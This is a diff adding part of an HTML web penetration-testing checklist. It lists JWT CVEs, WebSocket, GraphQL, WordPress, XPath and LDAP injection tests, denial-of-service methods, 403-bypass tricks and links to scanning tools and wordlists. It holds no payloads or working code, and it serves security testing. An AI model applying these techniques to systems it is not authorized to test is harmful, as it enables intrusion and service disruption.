+      <li><input type="checkbox"> (CVE-2016-10555) The RS/HS256 public key mismatch vulnerability</li>
+      <li><input type="checkbox"> (CVE-2018-0114) Key injection vulnerability</li>
+      <li><input type="checkbox"> (CVE-2019-20933/CVE-2020-28637) Blank password vulnerability</li>
+      <li><input type="checkbox"> (CVE-2020-28042) Null signature vulnerability</li>
+      <div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;">Tool: <a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="1" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">jwt_tool</span><span></span></a>​</div><div style="position: relative; left: 0px;"></div></div>
+      
+      </ul>
+      
+      
+      
+      
+      <li><span class="caret">Websocket Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Intercepting and modifying WebSocket messages</li>
+      <li><input type="checkbox"> Websockets MITM attempts</li>
+      <li><input type="checkbox"> Testing secret header websocket</li>
+      <li><input type="checkbox"> Content stealing in websockets</li>
+      <li><input type="checkbox"> Token authentication testing in websockets</li>
+      
+      </ul>
+      
+      <li><span class="caret">GraphQL Vulnerabilities Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Inconsistent Authorization Checks</li>
+      <li><input type="checkbox"> Missing Validation of Custom Scalars</li>
+      <li><input type="checkbox"> Failure to Appropriately Rate-limit</li>
+      <li><input type="checkbox"> Introspection Query Enabled/Disabled</li>
+      
+      </ul>
+      
+      <li><span class="caret">WordPress Common Vulnerabilities</span>
+    <ul class="nested">
+      <li><input type="checkbox"> XSPA in wordpress</li>
+      <li><input type="checkbox"> Bruteforce in wp-login.php</li>
+      <li><input type="checkbox"> Information disclosure wordpress username</li>
+      <li><input type="checkbox"> Backup file wp-config exposed</li>
+      <li><input type="checkbox"> Log files exposed</li>
+      <li><input type="checkbox"> Denial of Service via load-styles.php</li>
+      <li><input type="checkbox"> Denial of Service via load-scripts.php</li>
+      <li><input type="checkbox"> DDOS using xmlrpc.php</li>
+      <li><input type="checkbox"> CVE-2018-6389</li>
+      <li><input type="checkbox"> CVE-2021-24364</li>
+      <li><input type="checkbox"> WP-Cronjob DOS</li>
+      </ul>
+      
+      <li><span class="caret">XPath Injection</span>
+    <ul class="nested">
+      <li><input type="checkbox"> XPath Injection</li>
+      <li><input type="checkbox"> XPath injection to exfiltrate data</li>
+      <li><input type="checkbox"> Blind and Time-based XPath injections to exfiltrate data</li>
+       </ul>
+       
+       <li><span class="caret">LDAP Injection</span>
+    <ul class="nested">
+      <li><input type="checkbox"> LDAP injection to bypass authentication</li>
+      <li><input type="checkbox"> LDAP injection to exfiltrate data</li>
+      </ul>
+      
+      <li><span class="caret">Denial of Service</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Cookie bomb</li>
+      <li><input type="checkbox"> Pixel flood, using image with a huge pixels</li>
+      <li><input type="checkbox"> Frame flood, using GIF with a huge frame</li>
+      <li><input type="checkbox"> ReDoS (Regex DoS)</li>
+      <li><input type="checkbox"> CPDoS (Cache Poisoned Denial of Service)</li>
+      </ul>
+      
+      
+      <li><span class="caret">403 Bypass</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Using "X-Original-URL" header</li>
+      <li><input type="checkbox"> Appending %2e after the first slash</li>
+      <li><input type="checkbox"> Try add dot (.) slash (/) and semicolon (;) in the URL</li>
+      <li><input type="checkbox"> Add "..;/" after the directory name</li>
+      <li><input type="checkbox"> Try to uppercase the alphabet in the url</li>
+      <li><input type="checkbox"> <a href="https://github.com/daffainfo/bypass-403" style="cursor:pointer;color:inherit;word-wrap:break-word;font-weight:600;text-decoration:inherit" class="notion-link-token notion-focusable-token notion-enable-hover" rel="noopener noreferrer" data-token-index="1" tabindex="0"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,.4);opacity:0.7" class="link-annotation-ef99c367-8bb4-43e8-912e-c096af14b9f2--1636731111">Tool-bypass-403</span></a></li>
+      <li><input type="checkbox"> Burp Extension-<a href="https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122" style="cursor:pointer;color:inherit;word-wrap:break-word;text-decoration:inherit" class="notion-link-token notion-focusable-token notion-enable-hover" rel="noopener noreferrer" data-token-index="1" tabindex="0"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,.4);opacity:0.7" class="link-annotation-74e34358-a0ef-45b6-b727-b93a97b15cb2-1077455533">403 Bypasser</span></a></li>
+      
+      </ul>
+      
+      
+      <li><span class="caret">Other Test Cases (All Categories)</span>
+    <ul class="nested">
+      <li><span class="caret">Testing for Role authorization</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if normal user can access the resources of high privileged users?</li>
+          <li><input type="checkbox"> Forced browsing</li>
+          <li><input type="checkbox"> Insecure direct object reference</li>
+          <li><input type="checkbox"> Parameter tampering to switch user account to high privileged user</li>
+          </ul>
+      <li><span class="caret">Check for security headers and at least</span>
+        <ul class="nested">
+          <li><input type="checkbox"> X Frame Options</li>
+          <li><input type="checkbox"> X-XSS header</li>
+          <li><input type="checkbox"> HSTS header</li>
+          <li><input type="checkbox"> CSP header</li>
+          <li><input type="checkbox"> Referrer Policy</li>
+          <li><input type="checkbox"> Cache Control</li>
+          <li><input type="checkbox"> Public key pins</li>
+
+          </ul>
+       <li><span class="caret">Blind OS command injection</span>
+        <ul class="nested">
+          <li><input type="checkbox"> using time delays</li>
+          <li><input type="checkbox"> by redirecting output</li>
+          <li><input type="checkbox"> with out-of-band interaction</li>
+          <li><input type="checkbox"> with out-of-band data exfiltration</li>
+          </ul>
+     
+      
+      <li><input type="checkbox"> Command injection on CSV export (Upload/Download)</li>
+      <li><input type="checkbox"> CSV Excel Macro Injection</li>
+      <li><input type="checkbox"> If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability.</li>
+      <li><input type="checkbox"> Parameter Pollution Social Media Sharing Buttons</li>
+      
+       <li><span class="caret">Broken Cryptography</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Cryptography Implementation Flaw</li>
+          <li><input type="checkbox"> Encrypted Information Compromised</li>
+          <li><input type="checkbox"> Weak Ciphers Used for Encryption</li>
+          </ul>
+      </ul>
+
+<li><span class="caret">Burp Suite Extensions</span>
+    <ul class="nested">
+      <li><span class="caret">Scanners</span>
+        <ul class="nested">
+          <li><input type="checkbox"> <a href="https://github.com/albinowax/ActiveScanPlusPlus" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">ActiveScanPlusPlus</span><span></span></a></li>
+          <li><input type="checkbox"> <a href="https://github.com/portswigger/additional-scanner-checks" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">additional-scanner-checks</span><span></span></a></li>
+          <li><input type="checkbox"> <a href="https://github.com/PortSwigger/backslash-powered-scanner" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">backslash-powered-scanner</span><span></span></a></li>
+                </ul>
+
+      <li><span class="caret">Information Gathering</span>
+        <ul class="nested">          
+          
+          <li><input type="checkbox"> <a href="https://github.com/capt-meelo/filter-options-method" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">filter-options-method</span><span></span></a></li>
+          <li><input type="checkbox"> <a href="https://github.com/moeinfatehi/Admin-Panel_Finder" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">Admin-Panel_Finder</span><span></span></a></li>
+          <li><input type="checkbox"> <a href="https://github.com/raise-isayan/BigIPDiscover" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">BigIPDiscover</span><span></span></a></li>
+          <li><input type="checkbox"> <a href="https://github.com/P3GLEG/PwnBack" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">PwnBack</span><span></span></a></li>
+            </ul>
+      </ul>
+
+      
+      
+<li><span class="caret">Wordlists</span>
+    <ul class="nested">
+      <li><input type="checkbox"> <a href="https://wordlists.assetnote.io/" style="cursor:pointer;color:inherit;word-wrap:break-word;text-decoration:inherit" class="notion-link-token notion-focusable-token notion-enable-hover" rel="noopener noreferrer" data-token-index="0" tabindex="0"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,.4);opacity:0.7" class="link-annotation-59e68af7-c357-4dd2-a7d4-e13ffb9dc4a2--343610069">https://wordlists.assetnote.io/</span></a></li>
+      <li><input type="checkbox"> <a href="https://github.com/Karanxa/Bug-Bounty-Wordlists" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">Bug-Bounty-Wordlists</span><span></span></a></li>
+      <li><input type="checkbox"> <a href="https://github.com/0xPugazh/fuzz4bounty" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">fuzz4bounty</span><span></span></a></li>
+      <li><input type="checkbox"> <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">SecLists</span><span></span></a></li>
+      <li><input type="checkbox"> <a href="https://github.com/six2dez/OneListForAll" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">OneListForAll</span><span></span></a></li>
+      
+  
+</ul>
+
+  </ul>
+
+</body>
+<script>
+var toggler = document.getElementsByClassName("caret");
+var i;
+
+for (i = 0; i < toggler.length; i++) {
+  toggler[i].addEventListener("click", function() {
+    this.parentElement.querySelector(".nested").classList.toggle("active");
+    this.classList.toggle("caret-down");
+  });
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  var list = document.getElementById('myUL');
+  list.addEventListener('change', function(ev) {
+    if (ev.target.tagName === 'INPUT' && ev.target.type === 'checkbox') {
+      var listItem = ev.target.parentNode; 
+      if (ev.target.checked) {
+        listItem.classList.add('checked'); 
+      } else {
+        listItem.classList.remove('checked');
+      }
+    }
+  }, false);
+});
+</script>
+</html>
